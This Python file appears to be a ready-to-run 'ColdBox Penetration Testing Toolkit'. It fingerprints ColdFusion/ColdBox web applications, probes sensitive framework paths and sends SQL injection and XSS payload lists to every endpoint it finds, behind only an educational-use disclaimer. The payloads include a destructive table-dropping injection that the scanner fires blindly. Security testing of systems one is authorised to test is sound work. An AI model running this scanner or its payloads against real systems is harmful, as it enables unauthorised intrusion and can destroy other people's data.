#!/usr/bin/env python3
"""
ColdBox Penetration Testing Toolkit — library version for import
Only for demo/educational use. Do not use against systems you don't own/have permission for.
"""

import requests
import urllib.parse
import re
import json
import time
import random
import logging
from urllib.parse import urlparse
from typing import List, Dict, Optional

class ColdBoxPenTester:
    def __init__(self, target_url: str, session=None, timeout: int = 15):
        parsed = urlparse(target_url)
        if not parsed.scheme or not parsed.netloc:
            raise ValueError("Invalid URL format. Please include http:// or https://")
        self.target_url = f"{parsed.scheme}://{parsed.netloc}".rstrip('/')

        self.session = session or requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) ColdBoxPenTester/1.1',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
        })
        self.vulnerabilities = []
        self.endpoints = []
        self.timeout = timeout

        self.coldbox_paths = [
            '/index.cfm', '/Application.cfc', '/coldbox/', '/includes/',
            '/interceptors/', '/models/', '/views/', '/handlers/',
            '/config/', '/tests/'
        ]
        self.sql_payloads = [
            "' OR '1'='1", "' UNION SELECT NULL--", "'; DROP TABLE users--",
            "' AND 1=2 UNION SELECT NULL,NULL,NULL--", "admin'--",
            "' OR 1=1#", "' WAITFOR DELAY '0:0:5'--"
        ]
        self.xss_payloads = [
            "<script>alert('XSS')</script>", "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>", "'\"><script>alert('XSS')</script>",
            "<svg onload=alert('XSS')>", "';alert('XSS');//"
        ]

    def _safe_request(self, method: str, url: str, **kwargs) -> Optional[requests.Response]:
        try:
            kwargs.setdefault('timeout', self.timeout)
            if method.lower() == 'get':
                return self.session.get(url, **kwargs)
            elif method.lower() == 'post':
                return self.session.post(url, **kwargs)
            return None
        except requests.exceptions.RequestException as e:
            logging.warning(f"Request failed to {url}: {str(e)}")
            return None
        except Exception as e:
            logging.error(f"Unexpected error during request to {url}: {str(e)}")
            return None

    def reconnaissance(self) -> Dict:
        info = {
            'server_info': {}, 'technologies': [],
            'endpoints': [], 'forms': [],
            'cookies': [], 'errors': []
        }
        try:
            response = self._safe_request('get', self.target_url)
            if not response:
                info['errors'].append("Failed to connect to target URL")
                return info
            info['server_info']['status_code'] = response.status_code
            info['server_info']['headers'] = dict(response.headers)
            if 'x-powered-by' in response.headers:
                if 'coldfusion' in response.headers['x-powered-by'].lower():
                    info['technologies'].append('ColdFusion')
            if 'cfml' in response.text.lower() or 'coldfusion' in response.text.lower():
                info['technologies'].append('ColdFusion')
            if 'coldbox' in response.text.lower():
                info['technologies'].append('ColdBox')
            coldbox_patterns = [
                r'coldbox\.system', r'event\.getValue\(',
                r'rc\.', r'prc\.', r'ColdBox Framework'
            ]
            for pattern in coldbox_patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    info['technologies'].append(f'ColdBox Pattern: {pattern}')
            forms = re.findall(r'<form[^>]*>(.*?)</form>', response.text, re.DOTALL | re.IGNORECASE)
            info['forms'] = forms
            info['cookies'] = list(response.cookies.keys())
        except Exception as e:
            info['errors'].append(f"Error in reconnaissance: {str(e)}")
        return info

    def scan_endpoints(self) -> List[str]:
        found_endpoints = []
        for path in self.coldbox_paths:
            try:
                url = f"{self.target_url}{path}"
                response = self._safe_request('get', url)
                if not response:
                    continue
                if response.status_code == 200:
                    found_endpoints.append(url)
            except Exception as e:
                logging.error(f"Error scanning {path}: {str(e)}")
        self.endpoints = found_endpoints
        return found_endpoints

    def test_sql_injection(self, endpoint: str, params: Dict = None) -> List[Dict]:
        vulnerabilities = []
        test_params = params or {'id': '1', 'search': 'test', 'user': 'admin'}
        sql_errors = [
            'syntax error', 'mysql_fetch', 'ora-', 'microsoft ole db', 'cfquery',
            'datasource', 'sql exception', 'database error', 'sql syntax',
            'unclosed quotation mark'
        ]
        for param_name, param_value in test_params.items():
            for payload in self.sql_payloads:
                try:
                    test_params_get = test_params.copy()
                    test_params_get[param_name] = payload
                    response = self._safe_request('get', endpoint, params=test_params_get)
                    if response and any(error in response.text.lower() for error in sql_errors):
                        vulnerabilities.append({
                            'type': 'SQL Injection', 'endpoint': endpoint,
                            'parameter': param_name, 'payload': payload,
                            'method': 'GET', 'severity': 'High',
                            'evidence': 'SQL error found'
                        })
                except Exception:
                    continue
        return vulnerabilities

    def test_xss(self, endpoint: str, params: Dict = None) -> List[Dict]:
        vulnerabilities = []
        test_params = params or {'search': 'test', 'name': 'user', 'comment': 'hello'}
        for param_name, param_value in test_params.items():
            for payload in self.xss_payloads:
                try:
                    test_params_get = test_params.copy()
                    test_params_get[param_name] = payload
                    response = self._safe_request('get', endpoint, params=test_params_get)
                    if response and (payload in response.text or urllib.parse.unquote(payload) in response.text):
                        vulnerabilities.append({
                            'type': 'Cross-Site Scripting (XSS)', 'endpoint': endpoint,
                            'parameter': param_name, 'payload': payload,
                            'method': 'GET', 'severity': 'Medium',
                            'evidence': 'Payload reflected'
                        })
                except Exception:
                    continue
        return vulnerabilities

    def comprehensive_scan(self) -> Dict:
        results = {'reconnaissance': {}, 'endpoints': [], 'vulnerabilities': [], 'errors': []}
        results['reconnaissance'] = self.reconnaissance()
        results['endpoints'] = self.scan_endpoints()
        all_vulns = []
        for endpoint in self.endpoints:
            all_vulns.extend(self.test_sql_injection(endpoint))
            all_vulns.extend(self.test_xss(endpoint))
        results['vulnerabilities'] = all_vulns
        return results

    def generate_report(self, results: Dict) -> str:
        report = f"ColdBox Application Security Assessment Report\\n\\nTarget: {self.target_url}\\n"
        report += f"Total vulnerabilities: {len(results['vulnerabilities'])}\\n"
        for i, v in enumerate(results['vulnerabilities'], start=1):
            report += f"\\n{i}. {v['type']} ({v['severity']}) - {v['endpoint']}"
        return report
